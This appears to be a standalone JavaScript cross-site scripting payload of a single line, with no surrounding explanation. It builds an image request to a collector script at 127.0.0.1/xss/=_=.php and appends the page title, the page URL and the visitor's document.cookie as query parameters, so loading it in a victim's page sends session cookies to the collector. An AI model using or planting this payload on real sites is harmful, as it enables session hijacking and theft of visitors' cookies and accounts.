var baidu='http://127.0.0.1/xss/=_=.php';var x=new Image(); x.src=''+baidu+'?title='+document.title+'&url='+escape(document.location.href)+'&cookie='+escape(document.cookie); 
